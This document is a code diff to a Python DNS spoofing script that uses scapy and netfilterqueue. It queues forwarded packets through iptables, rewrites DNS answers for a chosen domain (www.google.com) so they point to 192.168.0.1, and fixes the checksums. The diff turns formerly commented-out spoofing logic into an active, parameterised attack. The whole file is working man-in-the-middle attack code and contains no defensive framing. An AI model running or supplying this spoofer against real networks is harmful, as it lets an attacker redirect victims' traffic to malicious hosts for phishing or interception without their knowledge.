@@ -6,7 +6,10 @@ import os
 
 
 class DNSSpoof:
-    def __init__(self):
+    def __init__(self, url, redirect):
+        self.url = url
+        self.redirect = redirect
+        self.scapy_packet = ""
         os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
         self.queue = netfilterqueue.NetfilterQueue()  # object of netfilterqueue class
         self.queue.bind(0, self.process_packet)  # bind the object to the que created in iptables
@@ -20,28 +23,25 @@ class DNSSpoof:
             os.system("iptables --flush")
 
     def process_packet(self, packet):
-        scapy_packet = scapy.IP(packet.get_payload())
-        print(scapy_packet.show())
-        if scapy_packet.haslayer(scapy.DNSRR):
-            # qname = scapy_packet[scapy.DNSQR].qname
-            # if "www.bing.com" in qname:
-            #     print("[+] Spoofing Target" + str(qname))
-            #     answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.1")
-            #     scapy_packet[scapy.DNS].an = answer
-            #     scapy_packet[scapy.DNS].ancount = 1
-            #
-            #     del scapy_packet[scapy.IP].len
-            #     del scapy_packet[scapy.IP].chksum
-            #     del scapy_packet[scapy.UDP].len
-            #     del scapy_packet[scapy.UDP].chksum
-            #
-            #     packet.set_payload(str(scapy_packet))
-
-            print(scapy_packet.show())
-        # print(scapy_packet)
-
-        # now forward this modified packet
+        self.scapy_packet = scapy.IP(packet.get_payload())
+        if self.scapy_packet.haslayer(scapy.DNSRR):
+            print(self.scapy_packet.show())
+            qname = self.scapy_packet[scapy.DNSQR].qname
+            if self.url in qname:
+                self.modify_packet(qname)
+                packet.set_payload(str(self.scapy_packet))
         packet.accept()
 
+    def modify_packet(self, qname):
+        print("[+] Spoofing Target" + str(qname))
+        answer = scapy.DNSRR(rrname=qname, rdata=self.redirect)
+        self.scapy_packet[scapy.DNS].an = answer
+        self.scapy_packet[scapy.DNS].ancount = 1
 
-dns_spoofer = DNSSpoof()
+        del self.scapy_packet[scapy.IP].len
+        del self.scapy_packet[scapy.IP].chksum
+        del self.scapy_packet[scapy.UDP].len
+        del self.scapy_packet[scapy.UDP].chksum
+
+
+dns_spoofer = DNSSpoof("www.google.com", "192.168.0.1")
